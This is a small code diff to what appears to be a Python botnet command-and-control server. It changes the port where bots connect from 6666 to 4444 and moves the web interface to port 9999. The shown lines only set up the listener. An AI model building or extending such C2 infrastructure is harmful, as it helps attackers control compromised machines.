@@ -60,9 +60,9 @@ def bot_handler(client_socket):
 # Listen for incoming bot connections
 def start_bot_listener():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(("0.0.0.0", 6666))
+    server_socket.bind(("0.0.0.0", 4444))
     server_socket.listen()
-    print("CNC server is listening for bots on port 6666...")
+    print("CNC server is listening for bots on port 4444...")
     while True:
         client_socket, _ = server_socket.accept()
         threading.Thread(target=bot_handler, args=(client_socket,)).start()
@@ -249,4 +249,4 @@ bot_template = """
 if __name__ == "__main__":
     init_db()
     threading.Thread(target=start_bot_listener, daemon=True).start()
-    app.run(host="0.0.0.0", port=6666)
+    app.run(host="0.0.0.0", port=9999)
